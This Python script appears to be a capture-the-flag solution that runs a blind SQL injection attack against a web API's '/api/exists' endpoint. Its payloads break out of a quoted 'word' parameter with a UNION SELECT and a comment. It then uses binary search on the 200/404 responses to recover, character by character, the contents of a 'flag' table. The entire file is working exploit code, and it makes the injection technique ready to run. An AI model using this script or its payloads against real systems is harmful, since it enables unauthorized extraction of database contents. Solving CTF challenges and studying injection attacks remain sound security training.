#!/usr/bin/env python3

import string
import sys
from typing import TypeVar
from urllib.parse import urljoin

import requests
import time


def query(s: requests.Session, baseURL: str, q: str) -> bool:
    r = s.get(urljoin(baseURL, "/api/exists"), params={"word": f"' {q} --"})
    time.sleep(0.1)

    if r.status_code == 200:
        return True
    elif r.status_code == 404:
        return False

    raise Exception(f"unexpected status code recevied for {q}: {r.status_code}")


T = TypeVar("T")


def search(s: requests.Session, baseURL: str, fmt: str, choices: list[T]) -> T:
    l, r = 0, len(choices) - 1
    while l <= r:
        m = l + (r - l) // 2
        guess = choices[m]

        if query(s, baseURL, fmt.format(guess=guess)):
            r = m - 1
        else:
            l = m + 1

    return choices[r + 1]


def main():
    if len(sys.argv) < 2:
        print("Specify base URL of task as first argument", file=sys.stderr)
        sys.exit(1)

    s = requests.session()
    baseURL = sys.argv[1]

    possible_lengths = list(range(32, 41))
    possible_filler_letters = sorted(string.ascii_letters + string.digits + "_-")
    possible_flag_letters = sorted(string.printable)
    possible_flag_letters.remove("'")

    flag = ""

    while True:
        index = len(flag)

        length = search(
            s,
            baseURL,
            f"union select 1 from flag where id = {index} and len(word) <= {{guess}}",
            possible_lengths,
        )

        print(f"len(flag_words[{index}]) = {length}")

        word = ""
        for i in range(length):
            choices = possible_filler_letters
            if i == length - 1:
                choices = possible_flag_letters

            letter = search(
                s,
                baseURL,
                f"union select 1 from flag where id = {index} and word >= '{word}{{guess}}'",
                choices[::-1],
            )

            word += letter
            print(f"flag_words[{index}] = {word}")

        flag += word[-1]
        print(f"flag = {flag}")

        if flag.endswith("}"):
            break


if __name__ == "__main__":
    main()
